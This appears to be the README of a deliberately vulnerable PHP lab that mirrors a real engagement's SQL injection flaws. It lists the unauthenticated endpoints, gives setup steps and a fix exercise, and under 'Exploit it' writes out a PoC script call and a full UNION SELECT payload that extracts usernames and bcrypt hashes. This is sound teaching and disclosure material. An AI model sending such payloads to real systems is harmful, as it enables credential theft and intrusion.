# Lab — Intentionally Vulnerable App (LOCAL USE ONLY)

This is a **deliberately vulnerable** PHP application that reproduces the same
bug class as the real engagement: unauthenticated, raw string interpolation into
SQL. It exists so the full technical detail can be published safely — no client
system is touched.

> **Never deploy this to a network.** It has no authentication and executes
> attacker-influenced SQL by design. Run it on an isolated local machine only.

## What it contains

| Endpoint | Bug |
|---|---|
| `/bmd/common/view_bulk_sticker?kib=&upb=&tahun=` | Raw `LIKE '$tahun%'` interpolation, auth guard removed → UNION SQLi |
| `/bmd/common/get_ref_by_search?search=` | Raw `LIKE "%$search%"` interpolation → SQLi |
| `/bmd/common/mass_approve` | No authentication on a privileged action |

The `user_login` table is seeded with a demo account and a bcrypt hash to mirror
the credential-disclosure impact.

## Run with Docker (recommended)

```bash
docker compose up --build
# app listens on http://localhost:8080
```

## Run without Docker

Requires PHP 8.1+ with `pdo_sqlite`:

```bash
cd vulnerable-app
php -S 0.0.0.0:8080 index.php
```

(Passing `index.php` as the router is required so deep paths such as
`/bmd/common/view_bulk_sticker` are handled.)

The SQLite database is created and seeded automatically on first request under
`vulnerable-app/data/`.

## Exploit it (lab only)

```bash
chmod +x exploits/sqli_union.sh
./exploits/sqli_union.sh http://localhost:8080
```

Expected: the script prints the benign sticker, then the UNION payload returns
the demo `username` and bcrypt `password` from `user_login`.

### Manual payload

```
GET /bmd/common/view_bulk_sticker?kib=kib_a&upb=1.1.1.1.1
    &tahun=2024%27%20UNION%20SELECT%20username,2,3,password,5,6,7,8,9
           %20FROM%20user_login--%20-
```

Only columns 1, 4, 6, 7, 8 and 9 are rendered by the template, so the payload
places the interesting data there.

## Fix it (exercise)

1. Replace the string-built query with a prepared statement.
2. Validate `tahun` as four digits.
3. Restore the authentication guard in `index.php` (`require_auth()`).
4. Escape output to also close the XSS hole.

## Files

```
lab/
├── docker-compose.yml
├── vulnerable-app/
│   ├── Dockerfile
│   └── index.php        # the vulnerable app
├── exploits/
│   └── sqli_union.sh    # PoC (localhost only)
└── screenshots/         # add your own sanitized captures here
```
